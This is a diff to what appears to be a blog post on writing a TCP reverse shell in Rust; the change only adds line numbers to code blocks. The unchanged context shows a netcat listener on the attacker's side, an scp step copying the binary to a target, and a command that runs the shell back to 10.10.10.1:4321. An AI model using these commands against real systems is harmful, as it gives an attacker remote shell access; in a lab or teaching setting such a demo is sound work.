@@ -18,7 +18,7 @@ executed as a TCP reverse shell in the target's system. Additionally, this code 
 
 # TCP Reverse Shell
 
-{% highlight rust %}
+{% highlight rust linenos %}
 use std::env;
 use std::fs::File;
 use std::net::TcpStream;
@@ -74,17 +74,17 @@ cargo install
 ## How to test the TCP Reverse Shell
 
 **1** Run a TCP server listening on the 4321 port in the attacker's system.
-  {% highlight bash %}
+  {% highlight bash linenos %}
     netcat -l -s 10.10.10.1 -p 4321
   {% endhighlight %}
 
 **2**  Copy the reverse shell program to the target's system.
-  {% highlight bash %}
+  {% highlight bash linenos %}
     scp reverse_shell demo@10.10.10.2:
   {% endhighlight %}
 
 **3**  Run the reverse_shell from the target's system
-  {% highlight bash %}
+  {% highlight bash linenos %}
     ./reverse_shell  10.10.10.1 4321
   {% endhighlight %}
 
